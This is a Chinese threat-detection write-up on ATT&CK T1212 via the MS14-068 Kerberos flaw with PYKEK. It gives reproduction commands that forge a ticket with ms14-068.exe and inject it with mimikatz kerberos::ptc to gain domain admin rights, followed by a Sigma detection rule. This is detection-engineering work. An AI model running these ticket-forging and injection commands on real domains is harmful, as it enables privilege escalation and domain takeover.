# T1212-windows-MS14-068-PYKEK

## 来自ATT&CK的描述

攻击者可能会利用软件漏洞来尝试收集凭据。当攻击者利用程序，服务或操作系统软件或内核本身内的编程错误来执行攻击者控制的代码时，就会利用软件漏洞。凭据和身份验证机制可能会被攻击者利用，以此作为获取有用凭据的途径或规避获取系统访问权限的过程。其中一个示例是MS14-068，它针对Kerberos，可用于使用域用户权限伪造Kerberos票证.对凭据访问的利用还可能导致特权升级，具体取决于目标过程或获取的凭据。

## 测试案例

可参考：[内网渗透之PTH&PTT&PTK](https://www.bbsmax.com/A/A7zgkjRPz4/)

## 检测日志

windows 安全日志（AD域控日志）

## 测试复现

测试步骤

域控主机（Windows server 2008）
域内主机（Windows 7 SP1）

```cmd
whoami /user #域内主机查找当前用户SID
dir \\DC\C$  #查看访问DC的权限
ms14-.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码 #域机器是可以和域控制器互通则会创建.ccache文件
```

票据注入

```cmd
mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
mimikatz # kerberos::list          //查看当前机器凭证
mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中
```

使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器

## 测试留痕

测试留痕文件：[MS14-068-PYKEK-windows.log](https://github.com/12306Bro/Threathunting-book/tree/master/Eventdata/MS14-068/PYKEK)

## 检测规则/思路

### sigma规则

```yml
title: MS14-068-PYKEK
description: windows server 2008 / windows 7
references: https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/golden_ticket.md
tags: T1212
status: experimental
author: 12306Bro
logsource:
    product: windows
    service: Security
detection:
    selection1:
        EventID: 4624 #账户登录
        Account Domain: '*.*' #新登录>账户域(正常情况下，账户域应为ABC，当存在PYKEK攻击时，账户域为ABC.COM)
        Account Name: '*' #新登录>账户名(不同于安全标识的帐户，此条件实现起来较为复杂)
    selection2:
        EventID: 4672 #管理员登录
        Account Domain: '*.*' #账户域(正常情况下，账户域应为ABC，当存在PYKEK攻击时，账户域为ABC.COM)
    selection3:
        EventID: 4768 #Kerberos TGS请求
        Supplied Realm Name: '*.*' #已提供的领域名称(正常情况下，已提供的领域名称应为ABC，当存在PYKEK攻击时，已提供的领域名称为ABC.COM)
    timeframe: last 5s
    condition: all of them
level: medium
```

### 建议

本规则未经过实际环境检验，谨慎使用

## 参考推荐

MITRE-ATT&CK-T1212

<https://attack.mitre.org/techniques/T1212/>

内网渗透之PTH&PTT&PTK

<https://www.bbsmax.com/A/A7zgkjRPz4/>
